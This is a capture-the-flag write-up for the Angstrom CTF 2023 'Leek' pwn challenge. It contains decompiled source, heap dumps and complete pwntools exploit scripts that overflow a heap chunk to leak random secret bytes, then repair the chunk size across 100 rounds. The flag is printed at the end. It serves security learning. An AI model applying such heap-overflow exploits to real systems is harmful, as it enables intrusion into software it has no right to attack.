---
name: Leek (2023)
event: Angstrom CTF 2023
category: Pwn
description: Writeup for Leek (Pwn) - Angstrom CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Leek

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/55jibxjUj3I/0.jpg)](https://youtu.be/55jibxjUj3I "Angstrom CTF 2023: Leek (pwn)")

## Reversing

#### source.c (manually renamed)

{% code overflow="wrap" %}
```c
void input(void *user_input)
{
  size_t buffer_len;
  long in_FS_OFFSET;
  char buffer [1288];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  fgets(buffer,1280,stdin);
  buffer_len = strlen(buffer);
  memcpy(user_input,buffer,buffer_len);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void main(void)
{
  __gid_t __rgid;
  int iVar1;
  time_t tVar2;
  char *userinput_chunk;
  char *random_chunk;
  long in_FS_OFFSET;
  int count;
  int i;
  char buffer [40];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("I dare you to leek my secret.");
  count = 0;
  while( true ) {
    if (99 < count) {
      puts("Looks like you made it through.");
      win();
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    userinput_chunk = (char *)malloc(16);
    random_chunk = (char *)malloc(32);
    memset(random_chunk,0,32);
    getrandom(random_chunk,32,0);
    for (i = 0; i < 32; i = i + 1) {
      if ((random_chunk[i] == '\0') || (random_chunk[i] == '\n')) {
        random_chunk[i] = '\x01';
      }
    }
    printf("Your input (NO STACK BUFFER OVERFLOWS!!): ");
    input(userinput_chunk);
    printf(":skull::skull::skull: bro really said: ");
    puts(userinput_chunk);
    printf("So? What\'s my secret? ");
    fgets(buffer,33,stdin);
    iVar1 = strncmp(random_chunk,buffer,32);
    if (iVar1 != 0) break;
    puts("Okay, I\'ll give you a reward for guessing it.");
    printf("Say what you want: ");
    gets(userinput_chunk);
    puts("Hmm... I changed my mind.");
    free(random_chunk);
    free(userinput_chunk);
    puts("Next round!");
    count = count + 1;
  }
  puts("Wrong!");
  exit(-1);
}
```
{% endcode %}

-   A chunk of 32 random bytes is created and we need to supply the matching bytes.
-   Do that 100 times, and we get the flag.
-   If we send 31 bytes, the output is leaked!

{% code overflow="wrap" %}
```bash
./leek
I dare you to leek my secret.
Your input (NO STACK BUFFER OVERFLOWS!!): aaaabaaacaaadaaaeaaafaaagaaahaaa
:skull::skull::skull: bro really said: aaaabaaacaaadaaaeaaafaaagaaahaaa
��`W;57r';I=׎�͇�t�. Ux+�<�
```
{% endcode %}

#### exploit.py

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './leek'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Send 31 bytes of random data
io.sendlineafter(b'):', cyclic(31))
io.recvline()

# Grab the secret
secret = io.recvline().strip()

io.sendafter(b'What\'s my secret?', secret)

io.sendlineafter(b'Say what you want:', b'B' * 24)

# Got Shell?
io.interactive()
```
{% endcode %}

The secret comparison works but we get a corrupt pointer error when the `random_chunk` is freed.

Set a breakpoint at the free (`break *0x4016b5`):

{% code overflow="wrap" %}
```python
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x704000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x704290
Size: 0x21

Allocated chunk
Addr: 0x7042b0
Size: 0xa20202020202020

x/33x 0x704290
0x704290:	0x00000000	0x00000000	0x00000021	0x00000000
0x7042a0:	0x61616161	0x61616161	0x61616161	0x61616161
0x7042b0:	0x61616161	0x20006161	0x20202020	0x0a202020
0x7042c0:	0xe5a949a7	0x7254dcf3	0x6ddb7450	0x49ac5203
0x7042d0:	0x99cc33d3	0xfe0408d5	0x85cc5cc0	0x14cc6617
0x7042e0:	0x00000000	0x00000000	0x00020d21	0x00000000
0x7042f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x704300:	0x00000000	0x00000000	0x00000000	0x00000000
0x704310:	0x00000000

```
{% endcode %}

Remember chunk layout:

{% code overflow="wrap" %}
```python
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
{% endcode %}

Setup a breakpoint after both chunks were created (`break *0x4015e2`) and check the heap:

{% code overflow="wrap" %}
```python
heap

Allocated chunk | PREV_INUSE
Addr: 0x234d000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x234d290
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x234d2b0
Size: 0x31

Top chunk | PREV_INUSE
Addr: 0x234d2e0
Size: 0x20d21
```
{% endcode %}

And a snippet of the chunks:

{% code overflow="wrap" %}
```python
vis

<SNIP>
0x234d280	0x0000000000000000	0x0000000000000000	................
0x234d290	0x0000000000000000	0x0000000000000021	........!.......
0x234d2a0	0x0000000000000000	0x0000000000000000	................
0x234d2b0	0x0000000000000000	0x0000000000000031	........1.......
0x234d2c0	0x38792607b67d1ca8	0x853dba19534d2a62	..}..&y8b*MS..=.
0x234d2d0	0x6dd625b0b35bbbe5	0x339f2c977abf3e7c	..[..%.m|>.z.,.3
0x234d2e0	0x0000000000000000	0x0000000000020d21	........!....... <-- Top chunk
```
{% endcode %}

So, we should be setting the size of the chunk `0x234d2b0` to `0x31`

{% code overflow="wrap" %}
```python
x/32gx 0x234d280
0x234d280:	0x0000000000000000	0x0000000000000000
0x234d290:	0x0000000000000000	0x0000000000000021
0x234d2a0:	0x0000000000000000	0x0000000000000000
0x234d2b0:	0x0000000000000000	0x0000000000000000
0x234d2c0:	0x38792607b67d0011	0x853dba19534d2a62
0x234d2d0:	0x6dd625b0b35bbbe5	0x339f2c977abf3e7c
0x234d2e0:	0x0000000000000000	0x0000000000020d21
0x234d2f0:	0x0000000000000000	0x0000000000000000
0x234d300:	0x0000000000000000	0x0000000000000000
0x234d310:	0x0000000000000000	0x0000000000000000
0x234d320:	0x0000000000000000	0x0000000000000000
0x234d330:	0x0000000000000000	0x0000000000000000
0x234d340:	0x0000000000000000	0x0000000000000000
0x234d350:	0x0000000000000000	0x0000000000000000
0x234d360:	0x0000000000000000	0x0000000000000000
0x234d370:	0x0000000000000000	0x0000000000000000
```
{% endcode %}

To do that, we supply `0x00 * 24` into the `userinput_chunk` which fills up `0x234d2a0` until we reach the size of the next chunk, where we write `0x31` while being careful to ensure correct padding, e.g. `0x31 + (0x00 * 6)`.

## Solution

TLDR; when we supply 31 bytes into our 16 byte `userinput_chunk`, we merge the chunks so that when our chunk is printed back to us, we also get the random data.

After supplying the secret, we need to repair the heap layout (fix the size of the random data chunk), ready for the next loop.

#### solve.py

{% code overflow="wrap" %}
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x4015e2
break *0x4016b5
heap
continue
'''.format(**locals())

# Binary filename
exe = './leek'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

for i in range(100):
    # Chunk is 16 bytes, then 8 bytes size of chunk, then the size of next chunk
    # Send 31 bytes of data is just enough to overwrite size of next chunk (secret data)
    io.sendlineafter(b'):', cyclic(31))
    io.recvline()

    # Now, when it prints out userinput_chunk, it prints the merged chunk (leak secret)
    secret = io.recvline()[0:32]

    # Send the secret
    io.sendafter(b'What\'s my secret?', secret)

    # Fix the chunk (we need to repair it for the next iteration)
    io.sendlineafter(b'Say what you want:', (b'\x00' * 24) + b'\x31' + (b'\x00' * 6))

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `actf{very_133k_of_y0u_777522a2c32b7dd6}`
